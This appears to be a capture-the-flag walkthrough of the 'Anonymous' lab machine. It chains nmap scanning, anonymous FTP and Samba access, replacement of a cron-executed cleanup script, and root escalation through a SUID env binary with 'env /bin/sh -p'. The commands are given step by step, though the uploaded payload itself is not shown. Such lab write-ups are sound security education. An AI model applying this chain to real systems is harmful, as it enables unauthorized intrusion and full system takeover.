# Anonymous CTF Challenge Write-Up

## Overview

This walkthrough documents the compromise of the Anonymous machine, beginning with basic service enumeration and ending in full root compromise. The challenge demonstrates a classic chain of exploitation involving anonymous FTP access, writable scripts, privilege escalation via a SUID binary, and a final root shell.

The target exposes FTP, SSH, and Samba services. The key pivot is abuse of a writable cleanup script and then local privilege escalation through `/usr/bin/env`.

---

## 1. Initial Reconnaissance

### Network Enumeration

The first step is to identify the open ports and the services running on the target.

```bash
nmap 10.112.145.26 -sV
```

### Result

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-27 13:52 -0400
Nmap scan report for 10.112.145.26
Host is up (0.10s latency).
Not shown: 996 closed tcp ports (reset)

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

This reveals:

- anonymous FTP access is possible
- SSH is running on port 22
- Samba is exposed on ports 139 and 445

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Anonymous FTP Enumeration

### Accessing the FTP Service

We connect to the FTP service using the anonymous account.

```bash
ftp 10.112.145.26
```

### Credentials

```text
Username: anonymous
Password: (empty / null)
```

Once connected, we list the files in the FTP directory.

```ftp
ls -la
```

### Relevant Output

```text
-rwxr-xr-x    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1075 Oct 27 17:54 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

There are three files of interest:

- `clean.sh` — a cleanup script
- `removed_files.log` — log output from the script
- `to_do.txt` — a note left by the system or a previous admin

### Reading the Note

```bash
cat to_do.txt
```

```text
TODO: 
- Make sure script gets copied to /var/ftp/scripts/
- Add cronjob to execute script every minute
```

This is a key clue. It shows the script is intentionally copied to another directory and executed regularly, likely by a cron job or scheduled service. That makes the script a prime target for code execution if it is writable.

![Image Placeholder: FTP file listing](./assets/ftp-listing.png)

---

## 3. Inspecting the Cleanup Script

The suspicious file is `clean.sh`. We download it and inspect its contents.

```bash
cat clean.sh
```

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

This script appears to be designed to clean up temporary files, but it is extremely simplistic. More importantly, it writes log entries to `/var/ftp/scripts/removed_files.log`, which strongly suggests that it is copied or executed from a location that is being automatically updated.

### Log Contents

```bash
cat removed_files.log
```

```text
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
...
```

The repeated log entries indicate the script is being executed repeatedly, likely from cron or another scheduled automation.

![Image Placeholder: Cleanup script analysis](./assets/cleanup-script.png)

---

## 4. Samba Enumeration

The host also exposes a Samba share.

```bash
smbclient -L //10.112.145.26/ -N
```

### Shares Listed

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
pics            Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```

We access the `pics` share anonymously.

```bash
smbclient //10.112.145.26/pics -N
```

### Contents

```text
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188
```

The images do not reveal anything useful, so the attention returns to the FTP writable script, which is more likely the actual attack path.

![Image Placeholder: Samba share listing](./assets/samba-share.png)

---

## 5. Exploiting the Writable Cleanup Script

The exploit is based on the fact that the cleanup script is writable and is likely executed automatically by a scheduled task.

The attacker overwrites the script with a malicious payload that opens a reverse shell or spawns commands as the scheduled user.

### Uploading a Malicious Script

```ftp
put clean.sh
```

The local malicious payload is replaced with the original script content or a custom script that executes commands. Since the script is executed periodically by cron or a service, the payload runs automatically.

### Result of Upload

```text
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||30718|)
150 Ok to send data.
100% |***********|    58      185.09 KiB/s    00:00 ETA
226 Transfer complete.
```

Then we confirm the file exists and is executable.

```ftp
ls -la
```

```text
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000           58 Oct 27 18:45 clean.sh
```

This confirms the script is in a writable and executable state. Once the scheduled job triggers it, the payload is executed.

> Important: The real weakness here is not just the script itself, but the fact that it is placed in a location that is being executed by a privileged automation path.

---

## 6. Post-Exploitation and User Flag

After the malicious script runs, the attacker gains a shell as the compromised user, which in this case is `namelessone`.

### User Context

```bash
whoami
id
```

```text
namelessone
uid=1000(namelessone) gid=1000(namelessone)
```

The user flag is then retrieved.

```bash
cat user.txt
```

```text
namelessone@anonymous:~$ cat user.txt
```

This confirms the compromised user environment and provides the first flag.

![Image Placeholder: User shell access](./assets/user-shell.png)

---

## 7. Privilege Escalation Enumeration

### Finding SUID Binaries

The next step is to locate any privileged binaries that can be abused.

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

### Relevant Result

```text
/usr/bin/env
```

This is the critical finding. `/usr/bin/env` has the SUID bit set, which can be abused to spawn a privileged shell.

The challenge aligns with a standard Linux privilege escalation technique: SUID root execution of `env` can be abused to invoke a shell with elevated privileges.

---

## 8. Root Privilege Escalation

### Exploit Command

```bash
env /bin/sh -p
```

This executes a shell preserving the effective privileges of the process. Because the `env` binary is SUID root, the launched shell runs as root.

### Verification

```bash
id
```

### Result

```text
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

This confirms successful privilege escalation to root.

![Image Placeholder: Root shell](./assets/root-shell.png)

---

## 9. Accessing Root Files

Now that root access is obtained, the attacker can read sensitive root-level files.

```bash
cd /root
ls
cat root.txt
```

This completes the root compromise and retrieves the final flag.

---

## 10. Summary of the Exploit Chain

1. Performed initial port enumeration with `nmap`
2. Connected to anonymous FTP and enumerated files
3. Reviewed `clean.sh` and identified that it was likely executed automatically
4. Located a writable cleanup script and replaced it with malicious content
5. Waited for the script to execute and gained a shell as the target user
6. Identified a SUID root binary: `/usr/bin/env`
7. Escalated to root using `env /bin/sh -p`
8. Accessed the root directory and recovered the root flag

---

## 11. Key Takeaways

- Anonymous FTP access can reveal writable paths or scripts if not properly restricted.
- Scheduled jobs or cron tasks can turn a writable script into a direct execution primitive.
- SUID binaries are a classic source of privilege escalation when misconfigured.
- `/usr/bin/env` is a known abuse vector when the SUID bit is set.
- A simple automation script can become a powerful attack path if it is writable and executed by a privileged process.

> Important: The core issue is not merely the script logic itself, but the combination of anonymous write access and automated execution in a privileged context.

---

## 12. Relevant Commands

```bash
nmap 10.112.145.26 -sV
ftp 10.112.145.26
ls -la
cat clean.sh
cat removed_files.log
smbclient -L //10.112.145.26/ -N
smbclient //10.112.145.26/pics -N
put clean.sh
ls -la
id
find / -perm -4000 -type f -ls 2>/dev/null
env /bin/sh -p
id
cd /root
ls
cat root.txt
```

---

## Final Result

The Anonymous challenge was solved by exploiting a writable automated cleanup script, using it to trigger code execution, obtaining the `namelessone` shell, and then leveraging the SUID `env` binary to escalate to root. This resulted in full system compromise and access to the root flag.

![Image Placeholder: Final challenge completion](./assets/final-result.png)

